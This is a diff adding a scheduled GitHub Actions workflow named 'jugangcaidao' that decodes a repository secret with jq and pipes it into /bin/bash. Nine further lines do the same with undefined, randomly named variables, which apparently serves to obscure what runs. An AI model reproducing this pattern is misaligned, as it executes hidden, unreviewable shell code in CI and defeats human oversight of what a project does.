@@ -1,0 +1,28 @@
+name: jugangcaidao
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '59 1/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: jugangcaidao
+        env:
+          htrbu573: ${{ secrets.htrbu573 }}
+        run: |
+          echo $htrbu573 | jq -r .wnmua206 | /bin/bash
+          echo $o90 | jq -r .ohr6206 | /bin/bash
+          echo $guzg889 | jq -r .ynd8681 | /bin/bash
+          echo $otv99 | jq -r .ulr37686 | /bin/bash
+          echo $qu091 | jq -r .li66 | /bin/bash
+          echo $qonur447 | jq -r .pgj1 | /bin/bash
+          echo $ndh7700 | jq -r .jcb6700 | /bin/bash
+          echo $kfi714 | jq -r .cqws749 | /bin/bash
+          echo $uowu29891 | jq -r .aius67 | /bin/bash
+          echo $tu8 | jq -r .bmc451 | /bin/bash
+
